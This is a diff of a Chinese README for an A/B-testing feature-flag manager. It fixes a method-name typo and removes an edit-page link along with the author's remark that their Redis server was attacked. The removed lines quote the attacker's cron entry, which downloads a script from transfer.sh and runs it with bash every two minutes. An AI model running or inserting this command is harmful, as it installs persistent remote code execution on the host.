@@ -22,25 +22,12 @@
 > ```
 > 使用某个key是否生效：
 > 
-> [[ABTestManager sharedInstance] isFeatuerEnable:@"test"] 
+> [[ABTestManager sharedInstance] isFeatureEnable:@"test"] 
 > ```
 >
 
-编辑页面：
-
-[编辑灰度kv](http://47.98.179.35)
-
-
-
-# redis被攻击了。。。。这么牛逼，还来攻击我的阿里云。呵呵
-
  > ```
- > "*/2 * * * * curl -s 
- > https://transfer.sh/nPQIj/tmp.vNuHLvnQ4D
  > 
- > > .cmd && bash .cmd"
  > ```
- >
- > 
 
 #### TODO:后台页面登录与鉴权，编辑灰度列表功能。。。。初步设想是走一个鉴权，根据权限去拉自己的配置。
